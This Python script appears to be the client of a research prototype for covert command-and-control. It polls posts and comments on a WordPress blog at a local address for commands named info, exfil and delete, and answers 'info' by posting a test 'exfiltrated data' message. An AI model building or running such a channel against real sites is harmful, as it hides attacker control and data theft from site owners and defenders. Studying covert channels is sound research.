#!/usr/bin/env python3
from wpc2 import *
import datetime
import random
import sys
import tools

client_id = sys.argv[1]
random.seed(int(datetime.datetime.now().timestamp()) + int(client_id))

commands = [ "info", "exfil", "delete" ]

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.ack_channel = "2021/08/13/ack-channel/"
channel.exfil_channel_id = get_post_id(channel.target_blog, channel.exfil_channel)
channel.ack_channel_id = get_post_id(channel.target_blog, channel.ack_channel)

mtb_recv_config = ReceiveConfig()
mtb_recv_config.recvr_id = client_id
mtb_recv_config.recv_time_slot = 10
mtb_recv_config.process_time_slot = 20
mtb_recv_config.prev_unapproved_index = 0

btm_send_config= SendConfig()
btm_send_config.sender_id = client_id
btm_send_config.send_time_slot = 30
btm_send_config.confirm_time_slot = 50

mtb_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
while(True):
    log_print("[INFO] client: Waiting to receive data...", 1)
    received_data = receive_data(channel, 1, mtb_recv_config)
    mtb_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)

    command_to_execute = None
    for command in received_data:
        command_to_execute = command.split(":")[1].strip().lower()

    if command_to_execute == "info":
        log_print("[INFO] client: Got info command. Sending data...", 1)
        message = Message()
        message.message_id = generate_random_string(10)
        message.message = message.message_id + ": Exfiltrated Data Test"
        send_data(channel, message, btm_send_config)
    else:
        log_print("[INFO] client: No command to execute.", 1)
